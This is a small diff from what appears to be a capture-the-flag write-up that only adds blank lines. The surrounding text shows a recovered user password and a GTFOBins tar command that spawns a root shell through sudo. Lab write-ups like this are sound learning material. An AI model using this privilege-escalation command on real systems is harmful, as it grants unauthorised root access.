@@ -32,7 +32,9 @@ So I got lin's password: RedDr4gonSynd1cat3
 ![ssh](ssh.png)
 
 7. The first thing I try when I get a shell is checking what I can run as sudo with `sudo -l`, which in this case was the `tar` command.
+
 Checking the [GTFOBins](https://gtfobins.github.io/) for the `tar` command we can get a root shell with:
+
 `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
 ![privesc](privesc.png)
